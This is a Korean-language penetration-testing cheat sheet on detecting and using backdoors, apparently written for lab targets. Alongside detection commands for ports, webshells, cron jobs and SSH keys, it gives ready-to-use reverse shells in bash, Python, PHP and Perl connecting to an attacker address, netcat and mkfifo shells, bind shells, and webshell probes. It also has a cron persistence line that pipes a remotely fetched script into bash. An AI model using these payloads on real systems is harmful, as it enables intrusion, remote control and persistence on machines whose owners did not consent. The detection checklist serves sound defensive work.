# 백도어 탐지 및 활용

## 네트워크 연결 확인

```bash
# 리스닝 포트 확인
netstat -tunlp   # Linux
netstat -ano     # Windows

# 특이 연결 탐지
netstat -antup | grep ESTABLISHED
ss -antup        # 최신 리눅스 시스템에서는 ss 명령어 

# 비정상 리스닝 포트 확인
netstat -tunlp | grep -v -E "^(tcp6|udp6)"
netstat -tulpn | grep -E ':4444|:5555|:1337|:[0-9]{5}'  # 일반적인 백도어 포트
```

## 파일시스템 탐지

```bash
# 의심스러운 파일 검색
find / -type f -mtime -1 -not -path "/proc/*" -ls 2>/dev/null  # 24시간 내 수정 파일
find / -type f -perm -o+w -not -path "/proc/*" -ls 2>/dev/null  # 모두 쓰기 권한 파일
find / -name ".*" -type f -not -path "/proc/*" 2>/dev/null     # 숨겨진 파일

# 웹 백도어 검색 (PHP)
find /var/www/ -name "*.php" -type f -exec grep -l "system\|exec\|passthru\|shell_exec" {} \;
find /var/www/ -name "*.php" -type f -exec grep -l "eval *(" {} \;
find /var/www/ -name "*.php" -type f -exec grep -l "base64_decode" {} \;
```

## 프로세스/작업 검사

```bash
# 프로세스 검사
ps aux --forest      # 트리 형태로 프로세스 확인
ps aux | grep -i "nc\|netcat\|ncat\|socat"  # 네트워크 도구
ps aux | grep -v "^root\|^www-data\|^nobody"  # 비정상 사용자 프로세스

# 크론 작업 검사
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/root  # 루트 크론 작업 확인
```

## Netcat 백도어 검사/활용

```bash
# 열린 포트 테스트
nc -nvz 10.10.10.10 1-65535  # 전체 포트 스캔
nc -nvz 10.10.10.10 4000-5000  # 범위 스캔
nc -nvz 10.10.10.10 21 22 23 80 443 445 3306 5432 8080  # 특정 포트

# 배너 그랩
nc -nv 10.10.10.10 4444  # 특정 포트 배너 확인
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 10.10.10.10 80  # HTTP 배너

# 백도어 연결
nc 10.10.10.10 4444  # 기본 연결
nc -vn 10.10.10.10 4444  # 상세 출력
```

## 백도어 유형 및 활용

```bash
# 리버스 쉘 (타겟→공격자)
# 공격자 측
nc -lvnp 4444

# 타겟 측
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
nc -e /bin/bash 10.10.14.x 4444  # 구형 nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.x 4444 >/tmp/f  # 대안
```

## 백도어 유형별 탐지/대응

### PHP 웹 백도어
```bash
# 탐지
grep -r "system\|exec\|shell_exec\|passthru\|eval" /var/www/

# 일반적 백도어 파라미터
curl "http://target/shell.php?cmd=id"
curl "http://target/shell.php?c=id"
curl "http://target/shell.php?backdoor=id"
curl "http://target/shell.php" -d "cmd=id"

# 확인 방법
md5sum /var/www/html/wp-content/uploads/shell.php
stat /var/www/html/includes/shell.php  # 생성/수정 시간
```

### 크론 백도어
```bash
# 일반적 위치
/etc/cron.d/
/etc/crontab
/var/spool/cron/crontabs/

# 백도어 예시
*/10 * * * * root curl -s http://10.10.14.x/shell | bash
@daily www-data /tmp/.backdoor
```

### SSH 백도어
```bash
# 인증키 확인
find / -name "authorized_keys" -ls 2>/dev/null
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys

# 의심스러운 설정
cat /etc/ssh/sshd_config | grep -i "PermitRoot\|PasswordAuth\|PubkeyAuth"
```

## 빠른 백도어 배포

### 리버스 쉘 (타겟→공격자)
```bash
# Bash
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.10.14.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="10.10.14.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 바인드 쉘 (공격자→타겟)
```bash
# Netcat
nc -lvp 4444 -e /bin/bash  # 타겟에서 실행
nc 10.10.10.x 4444         # 공격자에서 연결

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

## 백도어 탐지 체크리스트

1. 네트워크 연결: `netstat -tunlp`, `ss -tunlp`
2. 비정상 포트: `lsof -i`
3. 의심 프로세스: `ps auxf`, `pstree -p`
4. 크론 작업: `cat /etc/crontab`, `/var/spool/cron/crontabs/*`
5. 웹쉘: `find /var/www -type f -mtime -3 -name "*.php"`
6. 권한 설정: `find / -perm -4000 -ls 2>/dev/null`
7. SSH 키: `~/.ssh/authorized_keys`
8. 로그 확인: `/var/log/auth.log`, `/var/log/apache2/access.log`
